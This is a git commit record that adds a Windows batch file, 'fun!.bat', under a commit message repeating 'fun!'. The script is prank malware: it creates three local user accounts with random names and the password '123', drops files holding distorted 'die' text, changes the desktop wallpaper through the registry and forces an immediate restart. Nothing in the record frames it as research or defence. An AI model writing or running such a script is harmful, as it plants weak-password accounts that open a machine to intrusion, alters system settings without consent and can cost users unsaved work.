036752bc5caaa68bcadcb2aab3a1277fd8d5847e
sussy123a <158772380+sussy123a@users.noreply.github.com>
2025-01-18 18:14:20 +0100

    fun!
    fun!fun!fun!fun!fun!fun!fun!fun!fun!fun!fun!fun!fun!fun!fun!fun!fun!fun!fun!fun!fun!fun!fun!fun!fun!fun!fun!fun!fun!fun!fun!fun!fun!fun!fun!fun!fun!fun!

---
+++ fun!.bat
@@ -0,0 +1,23 @@
+@echo off
+net user /add %random% 123
+net user /add %random% 123
+net user /add %random% 123
+echo d̴̡͇̩̩̯͋̋̄i̷̞͖̤̎̍͐͂ȩ̴̄͊̆̉̕̕ > %random%.txt
+echo d̴̡͇̩̩̯͋̋̄i̷̞͖̤̎̍͐͂ȩ̴̄͊̆̉̕̕ > %random%.txt
+echo d̴̡͇̩̩̯͋̋̄i̷̞͖̤̎̍͐͂ȩ̴̄͊̆̉̕̕ > %random%.txt
+echo d̴̡͇̩̩̯͋̋̄i̷̞͖̤̎̍͐͂ȩ̴̄͊̆̉̕̕ > %random%.txt
+echo d̴̡͇̩̩̯͋̋̄i̷̞͖̤̎̍͐͂ȩ̴̄͊̆̉̕̕ > %random%.txt
+echo d̴̡͇̩̩̯͋̋̄i̷̞͖̤̎̍͐͂ȩ̴̄͊̆̉̕̕ > %random%.txt
+echo d̴̡͇̩̩̯͋̋̄i̷̞͖̤̎̍͐͂ȩ̴̄͊̆̉̕̕ > %random%.txt
+echo d̴̡͇̩̩̯͋̋̄i̷̞͖̤̎̍͐͂ȩ̴̄͊̆̉̕̕ > %random%.txt
+echo d̴̡͇̩̩̯͋̋̄i̷̞͖̤̎̍͐͂ȩ̴̄͊̆̉̕̕ > %random%.txt
+echo d̴̡͇̩̩̯͋̋̄i̷̞͖̤̎̍͐͂ȩ̴̄͊̆̉̕̕ > %random%.txt
+echo d̴̡͇̩̩̯͋̋̄i̷̞͖̤̎̍͐͂ȩ̴̄͊̆̉̕̕ > %random%.txt
+echo d̴̡͇̩̩̯͋̋̄i̷̞͖̤̎̍͐͂ȩ̴̄͊̆̉̕̕ > %random%.txt
+echo d̴̡͇̩̩̯͋̋̄i̷̞͖̤̎̍͐͂ȩ̴̄͊̆̉̕̕ > %random%.txt
+echo d̴̡͇̩̩̯͋̋̄i̷̞͖̤̎̍͐͂ȩ̴̄͊̆̉̕̕ > %random%.txt
+reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%~dp0coolbackground.png" /f
+RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters
+echo your computer is gonna restart in 1 second
+timeout /t 1 >nul
+shutdown /r
